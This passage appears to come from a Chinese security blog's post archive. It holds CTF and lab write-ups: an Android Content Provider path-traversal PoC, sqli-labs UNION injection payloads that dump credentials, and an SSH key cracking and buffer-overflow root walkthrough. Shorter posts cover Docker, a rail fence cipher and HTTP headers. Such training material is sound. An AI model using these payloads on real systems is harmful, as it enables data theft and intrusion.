Provider的openFile()接口进行文件目录遍历以达到访问任意可读文件的目的。 &emsp;&emsp;此时的条件是对外暴露的Content Provider组件实现了openFile()接口 &emsp;&emsp;没有对所访问的目标文件 Uri 进行有效判断，如没有过滤限制如 ../ 可实现任意可读文件的访问的 Content Query Uri 。 &emsp;&emsp;比如，某 APP 的实现中定义了一个可以访问本地文件的 Content Provider 组件，默认的 android:exported=&quot;true&quot;，对应com.xxxx.android.jobs.html5.LocalFileContentProvider，该 Provider 实现了 openFile() 接口，通过此接口可以访问内部存储 app_webview 目录下的数据，由于后台未能对目标文件地址进行有效判断，可以通过”../“实现目录跨越，实现对任意私有数据的访问。 &emsp;&emsp;攻击poc public void GJContentProviderFileOperations()&#123; try&#123; InputStream in = getContentResolver().openInputStream(Uri.parse(&quot;content://com.xxx.html5.localfile.1/webview/../../shared_prefs/userinfo.xml&quot;)); ByteArrayOutputStream out = new ByteArrayOutputStream(); byte[] buffer = new byte[1024]; int n = in.read(buffer); while(n&gt;0)&#123; out.write(buffer, 0, n); n = in.read(buffer); Toast.makeText(getBaseContext(), out.toString(), Toast.LENGTH_LONG).show(); &#125; &#125;catch(Exception e)&#123; debugInfo(e.getMessage()); &#125;&#125;","categories":[{"name":"移动安全","slug":"移动安全","permalink":"https://wolke.cn/categories/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"移动安全","slug":"移动安全","permalink":"https://wolke.cn/tags/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/"},{"name":"Android","slug":"Android","permalink":"https://wolke.cn/tags/Android/"}],"author":"w01ke"},{"title":"sqlilabs 1-4","slug":"sqlilabs-1-4","date":"2021-12-06T11:23:13.000Z","updated":"2022-01-03T03:29:46.391Z","comments":true,"path":"post/f9788371.html","link":"","permalink":"https://wolke.cn/post/f9788371.html","excerpt":"","text":"第一关：GET-报错注入-单引号-字符型注入1.1 判断闭合方式 id=1\\可以知道为单引号闭合 id=1&#39;--+验证成功 1.2 查看有多少列 id=1&#39; order by 3--+用二分法知道有3列 1.3 使用联合报错注入 id=-1&#39; union select 1,2,3--+使前面报错，使用union报错注入，让后面的结果显示出来，发现2和3的位置可以显示出数据来 id=-1&#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),database()--+ 知道当前数据库security有emails、referers、uagents、users表 id=-1&#39; union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;),database()--+可以知道users表有id、username、password字段 第二关：GET-报错注入-数字型注入2.1 判断闭合方式 id=1\\发现貌似是数字型注入 id=1 and 1=1正常 id=1 and 1=2失败，可以知道是数字型注入 2.2 查看有多少列 id=1 order by 3 用二分法可以知道只有三列 2.3 使用联合报错注入 id=1 and 1=2 union select 1,2,3让前面报错，让后面的结果显示，可以发现2和3的位置会显示出来 id=1 and 1=2 union select 1,database(),(select group_concat(table_name) from information_schema.tables where table_schema=database())可以知道当前数据库为security，由emails、referers、uagents、users表 id=1 and 1=2 union select 1,2,(select group_concat(column_name) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;)可以知道users表有id、username、password字段 id=1 and 1=2 union select 1,2,(select group_concat(username,0x3a,password) from users)可以知道用户名和密码 id=-1&#39; union select 1,2,(select group_concat(username,0x3a,password) from users)--+成功爆出用户名和密码 第三关：GET-报错注入-单引号和括号-字符型注入3.1 判断闭合方式 使用\\爆出了错误，可以知道是用(‘xxx’)引起来的 id=1&#39;)--+ 验证成功 3.2 查看有多少列 id=1&#39;) order by 3 --+经过二分法等可以知道有三列 3.3 使用联合报错注入 id=-1&#39;) union select 1,2,3--+使用union联合注入，使前面报错，让后面的显示出来，发现2和3的位置会爆出错误信息，接下来就利用这两个位置进行操作 id=-1&#39;) union select 1,database(),(select table_name from information_schema.tables where table_schema=database() limit 0,1)--+ 或者直接使用id=-1&#39;) union select 1,database(),(select group_concat(table_name) from information_schema.tables where table_schema=database())--+ 可以知道数据库名为security，有emails、referers、uagents、users表 id=-1&#39;) union select 1,database(),(select group_concat(column_name) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;)--+可以知道users表有id、username、password字段 id=-1&#39;) union select 1,(select group_concat(username) from users),(select group_concat(password) from users)--+可以查看到用户名和密码 第四关：GET-报错注入-双引号和括号-字符型注入4.1 判断闭合方式 id=1\\可以知道是(“”)闭合 id=1&quot;) --+验证成功 4.2 查看有多少列 id=1&quot;) order by 3--+由二分法可以知道只有3列 4.3 使用联合报错注入 id=-1&quot;) union select 1,2,3--+使用union联合注入，使前面报错，让后面的显示出来，发现2和3的位置会爆出错误信息，接下来就利用这两个位置进行操作 id=-1&quot;) union select 1,database(),(select group_concat(table_name) from information_schema.tables where table_schema=database())--+可以知道数据库名为security，有emails、referers、uagents、users表 id=-1&quot;) union select 1,database(),(select group_concat(column_name) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;)--+可以知道users表有id、username、password字段 id=-1&quot;) union select 1,(select group_concat(username) from users),(select group_concat(password) from users)--+可以查看到用户名和密码","categories":[{"name":"方向靶场","slug":"方向靶场","permalink":"https://wolke.cn/categories/%E6%96%B9%E5%90%91%E9%9D%B6%E5%9C%BA/"}],"tags":[{"name":"SQL注入","slug":"SQL注入","permalink":"https://wolke.cn/tags/SQL%E6%B3%A8%E5%85%A5/"},{"name":"sqlilabs","slug":"sqlilabs","permalink":"https://wolke.cn/tags/sqlilabs/"}],"author":"w01ke"},{"title":"SSH私钥泄露","slug":"SSH私钥泄露","date":"2021-12-06T11:18:07.000Z","updated":"2022-01-03T03:29:57.638Z","comments":true,"path":"post/e8314d47.html","link":"","permalink":"https://wolke.cn/post/e8314d47.html","excerpt":"","text":"一、靶机说明1、下载链接&emsp;&emsp;靶场镜像：链接: https://pan.baidu.com/s/1xfKILyIzELi_ZgUw4aXT7w 提取码: 59g0 2、靶机准备（1）重置靶场密码&emsp;&emsp;重启主机，长按shift，进入如下界面后，按e &emsp;&emsp;找到linux开头的行，在最后输入 init=/bin/bash，输入完成后按Crtl+X &emsp;&emsp;mount -o rw,remount /，回车 &emsp;&emsp;passwd root，重置密码 &emsp;&emsp;如果提示改变密码成功，重启该虚拟机 （2）查看IP&emsp;&emsp;使用刚才修改的密码进入靶场主机，输入ip a，查看IP地址 二、信息收集1、发现靶机IP&emsp;&emsp;可以使用以下两种方法：arp-scan和netdiscover （1）arp-scan&emsp;&emsp;使用arp-scan探索靶机IP，发现IP地址为192.168.43.165 arp-scan -l （2）netdiscover&emsp;&emsp;使用以下命令查看Kali本机IP为192.168.43.167 ip a &emsp;&emsp;使用netdiscover命令 netdiscover -r ip/子网掩码 命令来探测靶机 netdiscover -r 192.168.43.1/24 2、开放端口与服务扫描&emsp;&emsp;使用nmap扫描 nmap -sV 192.168.43.165 &emsp;&emsp;发现 22–ssh、80–nginx、31337–python，这个31337端口可以看出来是python做的一个网站。此靶场机器上开启了ssh服务和两个http服务 &emsp;&emsp;接下来我们分析特殊端口，尤其对开放http服务的大端口（本靶机上31337端口开放了http服务） &emsp;&emsp;访问31337端口对应网站，没有文件，那就对该网站进行目录扫描 3、目录扫描&emsp;&emsp;使用dirsearch进行目录扫描： dirsearch -u http://192.168.43.165:31337 &emsp;&emsp;发现有 robots.txt、**/.ssh/id_rsa** 和 /.ssh/authorized_keys 等 &emsp;&emsp;或者使用dirb探测 dirb http://192.168.43.165:31337 &emsp;&emsp;访问robots.txt，发现以下文件路径，逐个访问 &emsp;&emsp;当访问 http://10.3.35.8:31337/taxes/ 的时候，可以看到第1个flag &emsp;&emsp;在前面我么们还看到有 /.ssh/id_rsa 和 /.ssh/authorized_keys，使用网站访问，将它们下载下来， 将下载下来的文件查看一下 id_rsa是私钥，authorized_keys 是认证关键字 id_rsa文件（公钥）需要密码才能打开 &emsp;&emsp;在authorized_keys文件（这里就是泄露的私钥）中疑似看到了一个账户名称 simon 三、漏洞探测与利用1、尝试建立ssh连接&emsp;&emsp;尝试建立ssh连接 ssh -i id_rsa simon@192.168.43.165 &emsp;&emsp;发现要输入密钥 id_rsa 的密码，那么我们可用通过破解私钥得到密码 2、破解私钥获取密码&emsp;&emsp;因为等会要使用到ssh2john，首先查看ssh2john的路径 locate ssh2john &emsp;&emsp;使用ssh2john.py将密钥信息转换为john可识别信息：（通过这个python文件记忆它的用处可能更好：ssh to john） python /usr/share/john/ssh2john.py id_rsa &gt; rsacrack &emsp;&emsp;利用字典破解解密rsacrack信息，发现密码 starwars zcat /usr/share/wordlists/rockyou.txt.gz | john --pipe --rule rsacrack或者john rsacrack 3、建立ssh连接&emsp;&emsp;使用simon去登录服务器ssh -i id_rsa simon@192.168.43.165，密码为：starwars，如果出现以下报错说明是文件权限的问题，修改权限为600重新连接即可 4、溢出提权&emsp;&emsp;登录成功，直接来一套简单的whoami和pwd等查看主机相关信息，发现root目录下有个flag.txt，但无权查看 &emsp;&emsp;登录成功， 从根目录“/”开始查找整个系统所有文件中拥有suid特殊权限的文件，并忽略错误以防打断查找，查看整台服务器具有root权限的文件 find / -perm -4000 2&gt;/dev/null &emsp;&emsp;好多东西，且/usr/local/bin/read_message可执行文件有root权限，刚刚看到当前目录是有这个可执行文件的源代码的，那先看下read_message.c这个文件，发现了flag2，同时进行代码审计 &emsp;&emsp;linux系统中，是可以靠编译c代码来成为系统一部分命令的！！！！查看read_message代码后，发现固定大小的数组，想能否制造内存溢出。经过实验我们惊奇的发现输入Simon与SimonAAA竟然有同样的输出！这说明read_message代码只关注前五个字符而不关注buf数组中其他字符。 #include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;// You&#x27;re getting close! Here&#x27;s another flag:// flag2&#123;use_the_source_luke&#125;int main(int argc, char *argv[]) &#123; char program[] = &quot;/usr/local/sbin/message&quot;; char buf[20]; char authorized[] = &quot;Simon&quot;; printf(&quot;What is your name?\\n&quot;); gets(buf); // Only compare first five chars to save precious cycles: if (!strncmp(authorized, buf, 5)) &#123; printf(&quot;Hello %s! Here is your message:\\n\\n&quot;, buf); // This is safe as the user can&#x27;t mess with the binary location: execve(program, NULL, NULL); &#125; else &#123; printf(&quot;Sorry %s, you&#x27;re not %s! The Internet Police have been informed of this violation.\\n&quot;, buf, authorized); exit(EXIT_FAILURE); &#125;&#125; &emsp;&emsp;即验证数组前5个字符，限定字符数为最多20个 ，前5个为Simon即可。我们试着输20多个字符使其溢出，输入超过他缓存字符长度的字符超出的部分为root权限的目录路径 &emsp;&emsp;进入目录：cd /usr/local/bin，执行可执行文件read_message，输入SimonAAAAAAAAAAAAAAA/bin/sh，提权成功。查看最后一个flag 三、情景&emsp;&emsp;有些企业，他们的员工在比如在/home/目录下，为了方便大家报表或者共享些其他文件资料等，就会开启一个http server来作为大家共享的一个平台，但是在每个员工的比如/home/xiaoming目录下，还有/home/xiaoming/.ssh/id_rsa和/home/xiaoming/.ssh/authorized_keys存在，我们就可以直接访问该目录下载这些文件得到ssh的私钥，造成SSH密钥泄露，以合法用户的名义登录到目标主机，进行后续内网渗透 四、解决方法 不要将密钥放到web目录下 将密钥放在别人字典扫不到的目录下","categories":[{"name":"综合靶场","slug":"综合靶场","permalink":"https://wolke.cn/categories/%E7%BB%BC%E5%90%88%E9%9D%B6%E5%9C%BA/"}],"tags":[{"name":"提权","slug":"提权","permalink":"https://wolke.cn/tags/%E6%8F%90%E6%9D%83/"},{"name":"SSH","slug":"SSH","permalink":"https://wolke.cn/tags/SSH/"}],"author":"w01ke"},{"title":"Docker概述","slug":"Docker概述","date":"2021-12-06T11:09:18.000Z","updated":"2022-01-03T03:26:08.467Z","comments":true,"path":"post/fb618b33.html","link":"","permalink":"https://wolke.cn/post/fb618b33.html","excerpt":"","text":"一、Docker为什么会出现&emsp;&emsp;一款产品：开发👉上线 经常需要两套环境！需要对其进行部署应用环境和应用配置。那么就有了开发人员和运维人员 &emsp;&emsp;问题：我在我的电脑上可以运行！但是在你的电脑就不能运行！或者版本更新，导致服务不可用！对于运维来说，考验就十分大，环境配置是十分的麻烦，每一个机器都要部署环境（集群Redis、ES、Hadoop）！费时费力。发布一个项目（jar+（Redis MySQL jdk ES）），项目能不能都带上环境安装打包？ &emsp;&emsp;Docker的思想就来自于集装箱 &emsp;&emsp;隔离：Docker核心思想！打包装箱！每个箱子都是互相隔离的。利用隔离机制可以将服务器利用到极致！比如多个应用都是都是交叉的，可能会有端口冲突，如果使用了Docker就会隔离起来，不会造成端口冲突 &emsp;&emsp;本质：所有的技术都是因为出现了一些问题，我们需要去解决，才去学习！ 二、Docker的历史&emsp;&emsp;2010年，几个搞IT的年轻人，就在美国成立了一家公司 dotCloud ，做一些paas的云计算服务！LXC（虚拟机）有关的容器技术！他们将自己的技术（容器化技术）命名就是Docker！ &emsp;&emsp;Docker刚刚诞生的时候，没有引起行业的注意。dotCloud就活不下去，于是提出了开源（开放源代码），2013年，Docker开源。越来越多人发现了Docker的优点，于是Docker火了，Docker每个月都会更新一个版本 &emsp;&emsp;2014年4月9日，Docker1.0发布 &emsp;&emsp;Docker为什么这么火，因为它十分的轻巧。在容器技术出现之前，我们都是使用虚拟机技术，虚拟机也是虚拟化技术，Docker容器技术，也是一种虚拟化技术 VM：Linux Centos原生镜像（一个电脑！）隔离，需要开启多个虚拟机 几个G 几分钟Docker：隔离，镜像（最核心的环境 4m + jdk + mysql）十分的小巧，运行镜像就可以了！小巧！几个M KB 秒级启动 &emsp;&emsp;到现在，所有开发人员都必须学会Docker！ &emsp;&emsp;Docker是基于Go语言开发的！开源项目！ &emsp;&emsp;官网：https://www.docker.com/ &emsp;&emsp;文档地址：https://docs.docker.com/ Docker的文档是超级详细的！ &emsp;&emsp;仓库地址：https://hub.docker.com/ 三、Docker能做什么3.1 虚拟机技术 &emsp;&emsp;虚拟机技术缺点： 资源占用十分多 冗余步骤多 启动很慢 3.2 容器化技术&emsp;&emsp;容器化技术不是模拟的一个完整的操作系统 3.3 不同点 传统虚拟机，虚拟出一条硬件，运行一个完整的操作系统，然后在这个系统上安装和运行软件 容器内的应用直接运行在宿主机的内容，容器是没有自己的内核的，也没有虚拟我们的硬件，所以就轻便了。 每个容器是互相隔离的，每个容器内都有一个属于自己的文件系统，互不影响 四、DevOps（开发、运维） 应用更快速的交付和部署 传统：一堆帮助文档，安装程序 Docker：打包镜像发布测试，一键运行 更便捷的升级和扩缩容 使用了Docker后，我们部署应用就和搭积木一样！ 项目打包为一个镜像，扩展 服务器A！服务器B 更简单的系统运维 在容器化之后，我们的开发和测试环境都是高度一致的 更高效的计算资源利用 Docker是内核级别的虚拟化，可以在一个物理机上可以运行很多的容器示例！服务器的性能可以被利用到极致 1核2G的服务器能运行很多服务！","categories":[{"name":"docker","slug":"docker","permalink":"https://wolke.cn/categories/docker/"}],"tags":[{"name":"docker","slug":"docker","permalink":"https://wolke.cn/tags/docker/"}],"author":"w01ke"},{"title":"栅栏密码","slug":"栅栏密码","date":"2021-12-06T10:54:44.000Z","updated":"2023-01-05T02:30:31.847Z","comments":true,"path":"post/54ca3f77.html","link":"","permalink":"https://wolke.cn/post/54ca3f77.html","excerpt":"","text":"一、介绍&emsp;&emsp;The rail fence cipher，所谓栅栏密码，就是把要加密的明文分成N个一组，然后把每组的第1个字连起来，形成一段无规律的话。 不过栅栏密码本身有一个潜规则，就是组成栅栏的字母一般不会太多。（一般不超过30个，也就是一、两句话） 二、加密原理 把将要传递的信息中的字母交替排成上下两行。 再将下面一行字母排在上面一行的后边，从而形成一段密码。 三、例子&emsp;&emsp;把将要传递的信息中的字母交替排成上下两行。 T E O G S D Y U T A E N NH L N E T A M S H V A E D &emsp;&emsp;密文：将下面一行字母排在上面一行的后边。 TEOGSDYUTAENN HLNETAMSHVAED &emsp;&emsp;解密：先将密文分为两行 T E O G S D Y U T A E N NH L N E T A M S H V A E D &emsp;&emsp;再按上下上下的顺序组合成一句话 &emsp;&emsp;明文： THE LONGEST DAY MUST HAVE AN END 四、扩展（1）在选择行数时可以使用多行，这样对于加密强度有所提高。 （2）可以在加密之后在使用其他密码进行加密，增加强度。 五、Python实现function = input(&quot;Input e to encrypt or d to decrypt:&quot;)function = function.upper()if function == &#x27;E&#x27;: encrypt_message = &quot;&quot; message = input(&quot;Please input your message:&quot;) message_length = len(message) fence_number = int(input(&quot;Please input your fence number:&quot;)) # 假如输入为2 # 创建全局空列表。encrypt_message_list0 = [],encrypt_message_list1 = [] for i in range(fence_number): s = &#x27;encrypt_message_list&#x27; + str(i) vars()[s] = [] # 将字符串的字符加入列表 for i in range(message_length): remainder = i % fence_number # 余数 s = &#x27;encrypt_message_list&#x27; + str(remainder) # 余数为0放第一行即encrypt_message_list0，余数为1放第二行即encrypt_message_list1 vars()[s].append(message[i]) # 打印加密信息 for i in range(fence_number): s = &#x27;encrypt_message_list&#x27; + str(i) print((vars()[s])) encrypt_message = encrypt_message + &quot;&quot;.join(vars()[s]) print(f&quot;栅栏数为&#123;fence_number&#125;的加密结果为: &#123;encrypt_message&#125;&quot;)elif function == &#x27;D&#x27;: encrypt_message = input(&quot;Please input your encrypt_message:&quot;) encrypt_message_length = len(encrypt_message) print(&quot;批量解密结果如下: &quot;) for fence_number in range(2, encrypt_message_length, 1): # 可能的栅栏数，就不考虑长度为1和密文长度的栅栏数了 decrypt_message_list = [] encrypt_message_list = list(encrypt_message) # 基本列表大小，即字符串大小除以栅栏数目，向下取整 basic_list_size = int(encrypt_message_length / fence_number) # 字符串大小除以栅栏数目取余，后面根据余数确定每个列表最终大小 remainder = encrypt_message_length % fence_number # 创建全局列表和全局列表的长度，并按照每个列表的长度依次将密文放到列表中 for i in range(fence_number): s = &#x27;decrypt_message_list&#x27; + str(i) l = &#x27;decrypt_message_list_length&#x27; + str(i) if remainder == 0: vars()[l] = basic_list_size else: vars()[l] = basic_list_size + 1 remainder -= 1 vars()[s] = encrypt_message_list[0:vars()[l]] del(encrypt_message_list[0:vars()[l]]) # 按照从上到下，从左到右的顺序将列表中的元素拼接成字符串 for column in range(basic_list_size + 1): for row in range(fence_number): s = &#x27;decrypt_message_list&#x27; + str(row) l = &#x27;decrypt_message_list_length&#x27; + str(row) if column &lt; vars()[l]: decrypt_message_list.append(vars()[s][column]) else: pass # 打印解密字符串 print(f&quot;栅栏数为&#123;fence_number&#125;的解密结果为&#123;&#x27;&#x27;.join(decrypt_message_list)&#125;&quot;)else: print(&quot;Input Error!&quot;)","categories":[{"name":"密码学","slug":"密码学","permalink":"https://wolke.cn/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/"}],"tags":[{"name":"密码学","slug":"密码学","permalink":"https://wolke.cn/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"},{"name":"古典密码","slug":"古典密码","permalink":"https://wolke.cn/tags/%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81/"}],"author":"w01ke"},{"title":"Web数据包拓展","slug":"Web数据包拓展","date":"2021-12-03T13:59:38.000Z","updated":"2022-01-03T03:30:36.132Z","comments":true,"path":"post/488cc6a6.html","link":"","permalink":"https://wolke.cn/post/488cc6a6.html","excerpt":"","text":"一、网站解析对应&emsp;&emsp;涉及到的攻击层面？（源码，搭建平台，系统，网络层等） &emsp;&emsp;涉及到的安全问题？（目录，敏感文件，弱口令，IP 及域名等） 二、HTTP/HTTPS数据包 三、HTTP/HTTPS具体区别3.1 HTTP简要通信过程&emsp;&emsp;建立连接–&gt;发送请求数据包–&gt;返回相应数据包–&gt;关闭连接 浏览器建立与Web服务器之间的连接 浏览器将请求数据打包（生成请求数据包）并发送到Web服务器 Web服务器将处理结果打包（生成相应数据包）并发送给浏览器 Web服务器关闭连接 3.2 HTTPS简要通信过程（见图） 四、Request请求数据包数据格式 请求行：请求类型/请求资源路径、版本的协议和类型 请求头：一些键值对，浏览器与Web服务器之间都可以发送，特定的某种含义 空行：请求头与请求体之间用一个空行隔开 请求体：要发送的数据（一般POST提交会使用）；例：user=123&amp;pas=123 例： # Request HeadersPOST /adduser HTTP/1.1Host: localhost:8030Connection: keep-aliveContent-Length: 16Pragma: no-cacheCache-Control: no-cacheOrigin: chrome-extension://fdmmgilgnpjigdojojpjoooidkmcomcmUser-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)Chrome/66.0.3359.181 Safari/537.36Content-Type: application/x-www-form-urlencodedAccept: */*Accept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q=0.9# Form Dataname=name&amp;age=11 4.1 请求行&emsp;&emsp;请求行由三个标记组成：请求方法、请求 URL 和 HTTP 版本，它们用空格分隔 &emsp;&emsp;例如：GET /index.html HTTP/1.1 &emsp;&emsp;HTTP规划定义了8种可能的请求方法： GET：检索URL中标识资源的一个简单请求HEAD：与GET方法相同，服务器只返回状态行和头标，并不返回请求文档POST：服务器接收被写入客户端输出流中的数据的请求PUT：服务器保存请求数据作为指定URL新内容的请求DELETE：服务器删除URL中命令的资源的请求OPTIONS：关于服务器支持的请求方法信息的请求TRACE：Web服务器反馈HTTP请求和其头标的请求CONNECT：已文档化，但当前未实现的一个方法，预留做隧道处理 4.2 请求头由关键字/值对组成，每行一对，关键字和值用冒号分隔。请求头标通知服务器腾于客户端的功能和标识。 HOST: 主机或域名地址 Accept：指浏览器或其他客户可以接受的 MIME 文件格式。Servlet 可以根据它判断并返回适当的文件格 式。 User-Agent：是客户浏览器名称 Host：对应网址 URL 中的 Web 名称和端口号。 Accept-Langeuage：指出浏览器可以接受的语言种类，如 en 或 en-us，指英语。 Connection：用来告诉服务器是否可以维持固定的 HTTP 连接。HTTP 是无连接的，HTTP/1.1 使用 Keep-Alive 为默认值，这样，当浏览器需要多个文件时（比如一个 HTML 文件和相关的图形文件），不需要每次都建立连接 Cookie：浏览器用这个属性向服务器发送 Cookie。Cookie 是在浏览器中寄存的小型数据体，它可以记载和服务器相关的用户信息，也可以用来实现会话功能。 X-Forwarded-For：是用于记录代理信息的，每经过一级代理(匿名代理除外)，代理服务器都会把这次请求的来源IP追加在X-Forwarded-For中 X-Real-IP：一般只记录真实发出请求的客户端IP Referer：表明产生请求的网页URL。如比从网页 /icconcept/index.jsp 中点击一个链接到网页 /icwork/search ，在向服务器发送的 GET /icwork/search 中的请求中，Referer是 http://hostname:8080/icconcept/index.jsp ，这个属性可以用来跟踪Web请求是从什么网站来的。（比如一些邀请链接就是通过Referer头来判别走的是谁的邀请，购买了什么商品，对邀请人进行奖励） Content-Type：用来表明 Request 的内容类型。可以用 HttpServletRequest 的 getContentType()方法取得。 Accept-Charset：指出浏览器可以接受的字符编码。英文浏览器的默认值是 ISO-8859-1. Accept-Encoding：指出浏览器可以接受的编码方式。编码方式不同于文件格式，它是为了压缩文件并加速文件传递速度。浏览器在接收到 Web 响应之后先解码，然后再检查文件格式。 空行：最后一个请求头标之后是空行，发送回车符和退行，通知服务器以下不再有头标。 请求数据：使用 POST 传送，最常使用的是 Content-Type 和 Content-Length 头标。 五、Respones返回数据包数据格式​ 一个响应由四个部分组成：状态行、响应头标、空行、响应数据。 状态行：协议版本、数字形式的状态代码和状态描述，每个元素之间以空格分隔 响应头标：包含服务器类型、日期、长度、内容类型等 空行：响应头与响应体之间用空行隔开 响应数据：浏览器会将实体内容中的数据取出来，生成相应的页面 HTTP 响应码： 1xx：信息，请求收到，继续处理 2xx：成功，行为被成功地接受、理解和采纳 3xx：重定向，为了完成请求，必须进一步执行的动作 4xx：客户端错误 5xx：服务器错误 判断文件（夹）是否存在 200 存在文件 3xx 均可能存在 403 存在文件夹 404 不存在文件及文件夹 500 均可能存在 因此在扫描网站后台时最好这三个选项都选上 响应头标：像请求头标一样，它们指出服务器的功能，标识出响应数据的细节 空行：最后一个响应头标之后是一个空行，发送回车符和退行，表明服务器以下不再有头标 响应数据：HTML文档和图像等，也就是HTML本身 六、例子6.1 第三方检测修改实现XSS攻击&emsp;&emsp;之前某长之家的IP查询功能页面，因为会通过数据包获取User-Agent信息并显示在网页上，而没有采取防御措施，因此有XSS漏洞，目前已修复 6.2 CTF或实际应用中部分考题解析（mozhe）6.2.1 浏览器信息伪造&emsp;&emsp;背景介绍：小墨了解到从微信6.0开始，其内嵌的浏览器在User Agent字符串中增加了NetType字段用于标识客户端（手机）当前的网络环境，增加之后真的安全吗？ &emsp;&emsp;解题方向： 根据页面提示，抓包分析除了判断浏览器类型还判断了微信特有的NetType &emsp;&emsp;查阅资料发现符合的User-Agent： Mozilla/5.0 (iPhone; CPU iPhone OS 8_0 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/12A365 MicroMessenger/6.0 NetType/2G &emsp;&emsp;KEY： mozhe1540417e23d339b162b1bbe84c9 6.2.2 投票常见漏洞分析溯源 &emsp;&emsp;随便投一票，发现说要微信打开 &emsp;&emsp;查阅资料知道微信的User-agent有： Mozilla/5.0 (Linux; U; Android 5.0.2; zh-cn; MI 2C Build/LRX22G) AppleWebKit/533.1 (KHTML, like Gecko)Version/4.0 MQQBrowser/5.4 TBS/025469 Mobile Safari/533.1 MicroMessenger/6.2.5.53_r2565f18.621 NetType/WIFI Language/zh_CN &emsp;&emsp;使用微信的User-Agent后，投票成功 &emsp;&emsp;使用Repeater再次进行一遍，无误 &emsp;&emsp;使用Intruder疯狂投票吧！ &emsp;&emsp;差不多就可以停了，KEY：mozhece264154fdee3bfe3040b0c3ba1 6.2.3 来源页伪造","categories":[{"name":"Web安全","slug":"Web安全","permalink":"https://wolke.cn/categories/Web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://wolke.cn/tags/Web%E5%AE%89%E5%85%A8/"}],"author":"w01ke"},{"title":"Bugku-Web-变量1","slug":"Bugku-Web-变量1","date":"2021-12-02T16:35:56.000Z","updated":"2022-01-03T03:25:36.065Z","comments":true,"path":"post/55589c6e.html","link":"","permalink":"https://wolke.cn/post/55589c6e.html","excerpt":"","text":"一、考察方向 PHP的$GLOBALS 正则表达式 二、PHP预备知识——$GLOBALS&emsp;&emsp;其中提示flag在变量中 “flag In the variable !” ，这里要普及一个PHP中特殊的变量 &emsp;&emsp;$GLOBALS —— 引用全局作用域中可用的全部变量。 &emsp;&emsp;说明：一个包含了全部变量的全局组合数组。变量的名字就是数组的键。 &emsp;&emsp;示例： #示例代码&lt;?phpfunction test() &#123; $foo = &quot;local variable&quot;; echo &#x27;$foo in global scope: &#x27; . $GLOBALS[&quot;foo&quot;] . &quot;\\n&quot;; echo &#x27;$foo in current scope: &#x27; . $foo . &quot;\\n&quot;;&#125;$foo = &quot;Example content&quot;;test();?&gt; #结果$foo in global scope: Example content$foo in current scope: local variable &emsp;&emsp;注意： “Superglobal”也称为自动化的全局变量。这就表示其在脚本的所有作用域中都是可用的。不需要在函数或方法中用 global $variable; 来访问它。 变量可用性。与所有其他超全局变量不同，$GLOBALS在PHP中总是可用的。 三、代码分析&emsp;&emsp;页面如下 &emsp;&emsp;其中正则表达式/^\\w+$/，意思是只能有字母和数字 两个//表示开始和结束 ^表示开始字符串 $表示结束字符串 \\w表示包含【a-z，A-Z, _ , 0-9】 +表示一个或者多个\\w 后面的i表示不区分大小写，在此处没用，因为\\w里已经包含了大小写。 四、解题&emsp;&emsp;访问http://114.67.246.176:12610/?args=GLOBALS，看到flag","categories":[{"name":"CTF","slug":"CTF","permalink":"https://wolke.cn/categories/CTF/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://wolke.cn/tags/Web/"},{"name":"CTF","slug":"CTF","permalink":"https://wolke.cn/tags/CTF/"}],"author":"w01ke"}],"categories":[{"name":"Web安全","slug":"Web安全","permalink":"https://wolke.cn/categories/Web%E5%AE%89%E5%85%A8/"},{"name":"Go","slug":"Go","permalink":"https://wolke.cn/categories/Go/"},{"name":"内网渗透","slug":"内网渗透","permalink":"https://wolke.cn/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"},{"name":"漏洞分析","slug":"漏洞分析","permalink":"https://wolke.cn/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"},{"name":"Python","slug":"Python","permalink":"https://wolke.cn/categories/Python/"},{"name":"薅羊毛","slug":"薅羊毛","permalink":"https://wolke.cn/categories/%E8%96%85%E7%BE%8A%E6%AF%9B/"},{"name":"安全工具/安全开发","slug":"安全工具-安全开发","permalink":"https://wolke.cn/categories/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7-%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/"},{"name":"社工","slug":"社工","permalink":"https://wolke.cn/categories/%E7%A4%BE%E5%B7%A5/"},{"name":"应急响应","slug":"应急响应","permalink":"https://wolke.cn/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"},{"name":"二进制","slug":"二进制","permalink":"https://wolke.cn/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6/"},{"name":"APT/社工","slug":"APT-社工","permalink":"https://wolke.cn/categories/APT-%E7%A4%BE%E5%B7%A5/"},{"name":"深度学习","slug":"深度学习","permalink":"https://wolke.cn/categories/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/"},{"name":"docker","slug":"docker","permalink":"https://wolke.cn/categories/docker/"},{"name":"PHP","slug":"PHP","permalink":"https://wolke.cn/categories/PHP/"},{"name":"密码学","slug":"密码学","permalink":"https://wolke.cn/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/"},{"name":"综合靶场","slug":"综合靶场","permalink":"https://wolke.cn/categories/%E7%BB%BC%E5%90%88%E9%9D%B6%E5%9C%BA/"},{"name":"移动安全","slug":"移动安全","permalink":"https://wolke.cn/categories/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/"},{"name":"方向靶场","slug":"方向靶场","permalin